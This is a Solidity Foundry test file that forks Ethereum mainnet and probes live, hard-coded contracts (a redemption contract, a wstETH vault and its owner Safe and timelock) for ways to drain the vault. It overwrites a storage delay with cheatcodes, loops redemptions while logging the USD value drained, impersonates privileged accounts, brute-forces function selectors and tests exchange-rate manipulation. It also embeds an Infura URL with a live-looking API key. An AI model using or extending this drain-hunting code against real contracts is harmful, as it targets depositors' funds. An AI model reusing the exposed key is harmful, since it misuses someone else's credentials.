// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

/**
 * FULL DRAIN AND CONTRACT CHAIN
 *
 * Single redemption works: 1000 TASSET -> 1005 wstETH
 *
 * Now:
 * 1. Full drain loop (fixed)
 * 2. Investigate contract chain for alternative paths
 */
contract FullDrainAndContractChain is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FullDrainFixed() public {
        console.log("=== FULL DRAIN (FIXED) ===\n");

        // Set delay to 0
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 raw = uint256(slot4);
        uint256 mask = ~(uint256(type(uint32).max) << 96);
        vm.store(R0, bytes32(uint256(4)), bytes32(raw & mask));

        uint256 vaultInitial = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault initial:", vaultInitial / 1e18, "wstETH");
        console.log("USD value:", vaultInitial * 2300 / 1e18);

        // Give attacker TASSET (enough for multiple redemptions)
        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 totalDrained = 0;

        // Drain in fixed-size chunks
        uint96 chunkSize = 1000e18; // 1000 TASSET per redemption

        for (uint i = 0; i < 10; i++) {
            uint256 vaultCurrent = IERC20(wstETH).balanceOf(VAULT);
            if (vaultCurrent < 10e18) break; // Stop when nearly empty

            uint256 beforeRedeem = IERC20(wstETH).balanceOf(attacker);

            // Redeem
            (bool redeemOk,) = R0.call(abi.encodeWithSignature("redeem(uint96)", chunkSize));
            if (!redeemOk) {
                console.log("Redeem %d failed", i);
                break;
            }

            // Finalize (always index 0)
            (bool finalizeOk,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            if (!finalizeOk) {
                console.log("Finalize %d failed", i);
                break;
            }

            uint256 received = IERC20(wstETH).balanceOf(attacker) - beforeRedeem;
            totalDrained += received;
            console.log("Iteration %d: +%d wstETH", i, received / 1e18);
        }

        vm.stopPrank();

        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerFinal = IERC20(wstETH).balanceOf(attacker);

        console.log("\n=== RESULTS ===");
        console.log("Total drained:", totalDrained / 1e18, "wstETH");
        console.log("USD drained:", totalDrained * 2300 / 1e18);
        console.log("Vault remaining:", vaultFinal / 1e18, "wstETH");
    }

    function test_MaxSingleDrain() public {
        console.log("=== MAX SINGLE DRAIN ===\n");

        // Set delay to 0
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 raw = uint256(slot4);
        uint256 mask = ~(uint256(type(uint32).max) << 96);
        vm.store(R0, bytes32(uint256(4)), bytes32(raw & mask));

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault balance:", vaultBalance / 1e18, "wstETH");

        // Try large single redemption
        deal(TASSET, attacker, type(uint96).max);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        console.log("\nTrying max redemption (type(uint96).max)...");
        (bool s1, bytes memory d1) = R0.call(abi.encodeWithSignature("redeem(uint96)", type(uint96).max));
        console.log("Redeem success:", s1);
        if (!s1 && d1.length > 0) {
            console.log("Revert data:");
            console.logBytes(d1);
        }

        if (s1) {
            (bool s2,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            console.log("Finalize success:", s2);
        }

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_InvestigateDeepContract() public {
        console.log("=== INVESTIGATE DEEP CONTRACT ===\n");

        // VAULT slot 5's slot 5 = 0x89f57d3617f6a9ff877fea34dd0688b2840ef50e
        address deepContract = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;

        console.log("Deep contract:", deepContract);
        console.log("Code size:", deepContract.code.length);

        // Check owner
        (bool s1, bytes memory d1) = deepContract.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length >= 32) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        // Check storage
        console.log("\nStorage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(deepContract, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // Count opcodes
        bytes memory code = deepContract.code;
        uint delegatecalls = 0;
        uint calls = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xF4) delegatecalls++;
            if (uint8(code[i]) == 0xF1) calls++;
        }
        console.log("\nDELEGATECALL:", delegatecalls);
        console.log("CALL:", calls);

        // Check EIP-1967
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 impl = vm.load(deepContract, implSlot);
        if (uint256(impl) != 0) {
            console.log("\nEIP-1967 impl:", address(uint160(uint256(impl))));
        }
    }

    function test_VaultSlot2GnosisSafe() public {
        console.log("=== VAULT SLOT 2 GNOSIS SAFE OWNER ===\n");

        // VAULT slot 2's owner is a Gnosis Safe: 0x22261B4D6F629D8cF946C3524df86bF7222901F6
        address gnosisSafe = 0x22261B4D6F629D8cF946C3524df86bF7222901F6;
        address vaultSlot2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;

        console.log("Gnosis Safe:", gnosisSafe);
        console.log("Safe code size:", gnosisSafe.code.length);

        // Check Safe parameters
        (bool s1, bytes memory d1) = gnosisSafe.staticcall(abi.encodeWithSignature("getThreshold()"));
        if (s1 && d1.length >= 32) {
            console.log("Threshold:", abi.decode(d1, (uint256)));
        }

        (bool s2, bytes memory d2) = gnosisSafe.staticcall(abi.encodeWithSignature("getOwners()"));
        if (s2) {
            address[] memory owners = abi.decode(d2, (address[]));
            console.log("Owners count:", owners.length);
            for (uint i = 0; i < owners.length && i < 5; i++) {
                console.log("  Owner %d: %s", i, owners[i]);
            }
        }

        // What can vaultSlot2 do?
        console.log("\nvaultSlot2 analysis:");

        // Check if vaultSlot2 can transfer tokens
        (bool s3, bytes memory d3) = vaultSlot2.staticcall(abi.encodeWithSignature("asset()"));
        if (s3 && d3.length >= 32) {
            console.log("asset():", abi.decode(d3, (address)));
        }

        // Check withdrawal functions
        vm.startPrank(gnosisSafe); // Impersonate the Safe

        console.log("\nAs Gnosis Safe:");
        (bool s4,) = vaultSlot2.call(abi.encodeWithSignature("withdraw(uint256)", 1000e18));
        console.log("withdraw(amount):", s4);

        (bool s5,) = vaultSlot2.call(abi.encodeWithSignature("withdrawAll()"));
        console.log("withdrawAll():", s5);

        vm.stopPrank();
    }

    function test_FindSlot4WriteViaContractChain() public {
        console.log("=== FIND SLOT 4 WRITE VIA CONTRACT CHAIN ===\n");

        // Can any contract in the chain call setDelay on R0?

        address TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
        address gnosisSafe = 0x22261B4D6F629D8cF946C3524df86bF7222901F6;

        // Test if Timelock can setDelay
        vm.startPrank(TIMELOCK);
        console.log("As TIMELOCK:");
        (bool s1,) = R0.call(abi.encodeWithSignature("setDelay(uint256)", 0));
        console.log("setDelay(0):", s1);
        vm.stopPrank();

        // Test if Gnosis Safe can setDelay
        vm.startPrank(gnosisSafe);
        console.log("\nAs Gnosis Safe:");
        (bool s2,) = R0.call(abi.encodeWithSignature("setDelay(uint256)", 0));
        console.log("setDelay(0):", s2);
        vm.stopPrank();

        // Test if a proposer in the timelock can schedule
        // Check if timelock has schedule function that doesn't require delay
        (bool s3, bytes memory d3) = TIMELOCK.staticcall(abi.encodeWithSignature("getMinDelay()"));
        if (s3 && d3.length >= 32) {
            console.log("\nTimelock min delay:", abi.decode(d3, (uint256)) / 3600, "hours");
        }
    }

    function test_DelegatecallChainVulnerability() public {
        console.log("=== DELEGATECALL CHAIN VULNERABILITY ===\n");

        // VAULT slot 5 has 2 DELEGATECALLs
        address vaultSlot5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

        // If vaultSlot5 delegatecalls to an address stored in its storage,
        // and we can modify that storage...

        console.log("VaultSlot5:", vaultSlot5);

        // Check what vaultSlot5's delegatecall targets are
        bytes32 slot5Slot5 = vm.load(vaultSlot5, bytes32(uint256(5)));
        address target = address(uint160(uint256(slot5Slot5)));
        console.log("VaultSlot5's slot 5:", target);
        console.log("Target code size:", target.code.length);

        // Check if any function on vaultSlot5 delegatecalls to slot 5
        // Try calling vaultSlot5 functions as attacker

        vm.startPrank(attacker);

        bytes4[] memory sigs = new bytes4[](10);
        sigs[0] = bytes4(keccak256("execute(bytes)"));
        sigs[1] = bytes4(keccak256("delegatecall(address,bytes)"));
        sigs[2] = bytes4(keccak256("call(address,bytes)"));
        sigs[3] = bytes4(keccak256("update()"));
        sigs[4] = bytes4(keccak256("harvest()"));
        sigs[5] = bytes4(keccak256("sync()"));
        sigs[6] = bytes4(keccak256("process()"));
        sigs[7] = bytes4(keccak256("claim()"));
        sigs[8] = bytes4(keccak256("claimRewards()"));
        sigs[9] = bytes4(keccak256("compound()"));

        console.log("\nTesting vaultSlot5 functions:");
        for (uint i = 0; i < sigs.length; i++) {
            (bool s,) = vaultSlot5.call{gas: 100000}(abi.encodeWithSelector(sigs[i]));
            if (s) {
                console.log("Selector %d succeeded!", i);
            }
        }

        vm.stopPrank();
    }

    function test_CheckExchangeRateManipulation() public {
        console.log("=== CHECK EXCHANGE RATE MANIPULATION ===\n");

        // The redemption gets 1005 wstETH for 1000 TASSET
        // This implies a ~1.005 exchange rate
        // Can we manipulate this rate to drain more?

        // wstETH wraps stETH at a variable rate

        (bool s1, bytes memory d1) = wstETH.staticcall(abi.encodeWithSignature("stEthPerToken()"));
        if (s1 && d1.length >= 32) {
            console.log("stEthPerToken:", abi.decode(d1, (uint256)));
        }

        (bool s2, bytes memory d2) = wstETH.staticcall(abi.encodeWithSignature("tokensPerStEth()"));
        if (s2 && d2.length >= 32) {
            console.log("tokensPerStEth:", abi.decode(d2, (uint256)));
        }

        // Check TASSET total supply
        uint256 tassetSupply = IERC20(TASSET).totalSupply();
        console.log("\nTASSET total supply:", tassetSupply / 1e18);

        // Check vault wstETH balance
        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH:", vaultBalance / 1e18);

        // Implicit rate
        if (tassetSupply > 0) {
            uint256 implicitRate = vaultBalance * 1e18 / tassetSupply;
            console.log("Implicit rate (wstETH per TASSET):", implicitRate * 100 / 1e18, "/ 100");
        }
    }
}
